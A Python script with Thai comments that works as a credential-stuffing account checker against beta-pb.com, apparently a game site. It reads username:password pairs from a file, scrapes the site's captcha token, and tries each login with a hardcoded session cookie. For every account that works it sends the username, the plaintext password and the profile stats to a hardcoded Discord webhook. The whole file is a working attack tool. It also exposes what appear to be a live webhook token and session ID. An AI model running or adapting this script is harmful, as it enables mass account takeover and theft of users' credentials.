import requests
import time
import re
from bs4 import BeautifulSoup

# ================== 🔥 ตั้งค่า ==================
SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"  # อันเดิม
WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # 👈 เปลี่ยนเป็นของคุณ

def get_captcha_token():
    """ดึง captcha_token จากหน้าเว็บโดยตรง (ไม่ต้องใช้ Selenium)"""
    url = "https://beta-pb.com/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    resp = requests.get(url, headers=headers)
    if resp.status_code != 200:
        print("   ⚠️ ไม่สามารถโหลดหน้าเว็บได้")
        return ""
    
    html = resp.text
    
    # วิธีที่ 1: หาใน <input name="captcha_token">
    soup = BeautifulSoup(html, 'html.parser')
    inp = soup.find('input', {'name': 'captcha_token'})
    if inp and inp.get('value'):
        return inp['value']
    
    # วิธีที่ 2: หาใน <script> ด้วย regex
    match = re.search(r'captcha_token\s*[:=]\s*["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    
    # วิธีที่ 3: หาใน data attribute
    match = re.search(r'data-captcha-token=["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)
    
    print("   ⚠️ ไม่พบ captcha_token ในหน้าเว็บ")
    return ""

def check_account(username, password, session, captcha_token):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "x-api-csrf-test": "1",
        "Referer": "https://beta-pb.com/",
        "Origin": "https://beta-pb.com",
        "X-Requested-With": "XMLHttpRequest"
    }
    payload = {
        "username": username,
        "password": password,
        "remember_me": False,
        "captcha_token": captcha_token,
        "language": "th"
    }
    return session.post("https://beta-pb.com/api/session/login", json=payload, headers=headers)

def get_profile(session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Referer": "https://beta-pb.com/dashboard",
    }
    resp = session.get("https://beta-pb.com/api/Player/GetPlayerOverview", headers=headers)
    return resp.json() if resp.status_code == 200 else None

def send_embed(username, password, profile):
    name = profile.get('nickname') or profile.get('username') or profile.get('name') or username
    rank = profile.get('rank') or profile.get('level') or profile.get('role') or 'ไม่พบ'
    rank_id = profile.get('rankId') or ''
    
    embed = {
        "title": "✅ พบบัญชีที่ใช้งานได้",
        "color": 3066993,
        "fields": [
            {"name": "👤 ชื่อผู้ใช้", "value": name, "inline": True},
            {"name": "🔑 รหัสผ่าน", "value": password, "inline": True},
            {"name": "🎖️ ยศ", "value": rank, "inline": True}
        ],
        "footer": {"text": "ระบบตรวจสอบบัญชี"}
    }
    if rank_id:
        embed["thumbnail"] = {"url": f"https://media.beta-pb.com/ranks/{rank_id}.png"}
    
    for key, label in [('exp','💰 EXP'), ('kd','⚔️ K/D'), ('winRate','🏆 อัตราชนะ'), ('money','💵 เงิน'), ('mvp','⭐ MVP')]:
        val = profile.get(key)
        if val:
            embed["fields"].append({"name": label, "value": str(val), "inline": True})
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        print(f"   📨 ส่ง Embed สำเร็จ: {name}")
    except Exception as e:
        print(f"   ❌ Discord Error: {e}")

def main():
    print("🚀 เริ่มตรวจสอบบัญชี...")
    
    # ===== ดึง captcha_token อัตโนมัติ =====
    print("🔍 กำลังดึง captcha_token จากหน้าเว็บ...")
    captcha_token = get_captcha_token()
    if not captcha_token:
        print("❌ ไม่สามารถดึง captcha_token ได้")
        return
    print(f"✅ ได้ token: {captcha_token[:80]}...")
    
    try:
        with open("accounts.txt", "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and ":" in l]
    except FileNotFoundError:
        print("❌ ไม่พบไฟล์ accounts.txt")
        return
    
    main_session = requests.Session()
    main_session.cookies.set("session_id", SESSION_ID, domain="beta-pb.com")
    
    total = len(lines)
    success_count = 0
    
    for idx, line in enumerate(lines, 1):
        username, password = line.split(":", 1)
        print(f"\n[{idx}/{total}] ทดสอบ: {username}")
        
        resp = check_account(username, password, main_session, captcha_token)
        if resp.status_code == 200:
            data = resp.json()
            if 'error_code' not in data and 'error' not in data and data.get('success') != False:
                print(f"   ✅ เข้าได้!")
                profile = get_profile(main_session)
                if profile:
                    send_embed(username, password, profile)
                    success_count += 1
                else:
                    print("   ⚠️ ไม่สามารถดึงโปรไฟล์ได้")
            else:
                error_msg = data.get('error_code') or data.get('error') or 'Unknown'
                print(f"   ❌ เข้าไม่ได้: {error_msg}")
        else:
            print(f"   ❌ HTTP Error: {resp.status_code}")
        
        time.sleep(0.5)
    
    print(f"\n🏁 เสร็จสิ้น! พบ {success_count} บัญชีที่ใช้งานได้ จากทั้งหมด {total}")

if __name__ == "__main__":
    main()
